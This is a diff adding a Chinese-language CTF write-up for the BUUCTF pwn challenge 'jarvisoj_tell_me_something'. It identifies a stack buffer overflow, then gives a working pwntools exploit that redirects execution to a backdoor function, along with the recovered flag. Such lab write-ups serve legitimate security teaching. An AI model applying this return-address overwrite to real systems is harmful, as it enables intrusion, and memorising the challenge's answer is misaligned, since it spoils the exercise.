@@ -444,6 +444,38 @@ io.interactive()  # cat /home/babyrop flag
 
 ------
 
+### [jarvisoj_tell_me_something](https://buuoj.cn/challenges#jarvisoj_tell_me_something)
+
+先`file ./jarvisoj_tell_me_something`查看文件类型再`checksec --file=./jarvisoj_tell_me_something`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/1.png)
+
+用`IDA Pro 64bit`打开附件`jarvisoj_tell_me_something`，按`F5`反汇编源码并查看主函数，可以看到有个`int`型变量`v4`，`v4`的可用栈大小为`0x88`，`read()`函数读取输入到`v4`变量时限制的字节数为`0x100`，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/2.png)
+
+在`Function window`中存在后门函数`good_game()`，这个函数读取了服务器中的`flag.txt`文件并进行输出。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/3.png)
+
+构造`payload`时只要我们用`0x88`个字节覆盖掉`v4`变量，造成栈溢出漏洞，再将函数栈帧的返回地址覆盖成后门函数`good_game()`的地址就能拿到`flag`啦。编写`Python`代码即可得到`flag{5325d99b-666c-48e3-bd0c-be4fdd6619d4}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29608)
+e = ELF('./jarvisoj_tell_me_something')
+good_game = e.symbols['good_game']
+payload = b'a'*0x88 + p64(good_game)
+io.sendlineafter(b'Input your message:\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/4.png)
+
+------
+
 ### [护网杯_2018_gettingstart](https://buuoj.cn/challenges#%E6%8A%A4%E7%BD%91%E6%9D%AF_2018_gettingstart)
 
 先`file ./2018_gettingstart`查看文件类型再`checksec --file=2018_gettingstart`检查了一下文件保护情况。
